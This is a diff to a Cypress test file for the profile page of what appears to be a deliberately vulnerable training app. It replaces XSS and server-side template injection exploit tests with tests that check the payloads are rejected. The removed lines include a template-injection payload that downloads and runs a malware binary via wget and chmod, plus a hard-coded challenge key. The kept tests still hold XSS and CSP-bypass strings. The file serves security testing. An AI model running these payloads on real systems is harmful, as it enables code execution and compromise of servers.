@@ -16,55 +16,48 @@ describe('/profile', () => {
   })
 
   describe('challenge "usernameXss"', () => {
-    it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
-      cy.task('isDocker').then((isDocker) => {
-        if (!isDocker) {
-          cy.visit('/profile')
-          cy.get('#url').type(
-            "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'"
-          )
-          cy.get('#submitUrl').click()
-          cy.get('#username').type('<<a|ascript>alert(`xss`)</script>')
-          cy.get('#submit').click()
+    it('should reject a script tag in the username even after disarming CSP via profile image URL', () => {
+      const alert = cy.stub()
+      cy.on('window:alert', alert)
+      cy.visit('/profile')
+      cy.get('#url').type(
+        "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'"
+      )
+      cy.get('#submitUrl').click()
+      cy.request({ method: 'POST', url: '/profile', form: true, body: { username: '<<a|ascript>alert(`xss`)</script>' }, failOnStatusCode: false })
+        .its('status').should('eq', 400)
 
-          cy.on('window:alert', (t) => {
-            expect(t).to.equal('xss')
-          })
-
-          cy.get('#username').clear()
-          cy.get('#username').type('αδмιη')
-          cy.get('#submit').click()
-
-          cy.get('#url').type(
-            `${Cypress.config('baseUrl')}/assets/public/images/uploads/default.svg`
-          )
-          cy.get('#submitUrl').click()
-          cy.visit('/#/')
-          cy.expectChallengeSolved({ challenge: 'CSP Bypass' })
-        }
+      cy.visit('/profile')
+      cy.get('#username').should('be.visible').then(() => {
+        expect(alert).not.to.have.been.called
       })
+
+      cy.get('#url').type(
+        `${Cypress.config('baseUrl')}/assets/public/images/uploads/default.svg`
+      )
+      cy.get('#submitUrl').click()
     })
   })
 
   describe('challenge "ssti"', () => {
-    it('should be possible to inject arbitrary nodeJs commands in username', () => {
-      cy.task('isDocker').then((isDocker) => {
-        if (!isDocker) {
-          cy.visit('/profile')
-          cy.get('#username').type(
-            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
-            { parseSpecialCharSequences: false }
-          )
-          cy.get('#submit').click()
-          cy.request(
-            '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'
-          )
-          cy.visit('/')
-          // void browser.driver.sleep(10000);
-          // void browser.waitForAngularEnabled(true);
-          cy.expectChallengeSolved({ challenge: 'SSTi' })
-        }
-      })
+    it('should reject Pug interpolation in the username', () => {
+      cy.request({ method: 'POST', url: '/profile', form: true, body: { username: 'a#{7*7}' }, failOnStatusCode: false })
+        .its('status').should('eq', 400)
+
+      cy.visit('/profile')
+      cy.contains('p', /^a49$/).should('not.exist')
+    })
+
+    it('should still accept a plain username', () => {
+      cy.visit('/profile')
+      cy.get('#username').clear()
+      cy.get('#username').type("Jim O'Brien-Smith")
+      cy.get('#submit').click()
+
+      cy.contains('p', "Jim O'Brien-Smith").should('be.visible')
+
+      cy.get('#username').clear()
+      cy.get('#submit').click()
     })
   })
 
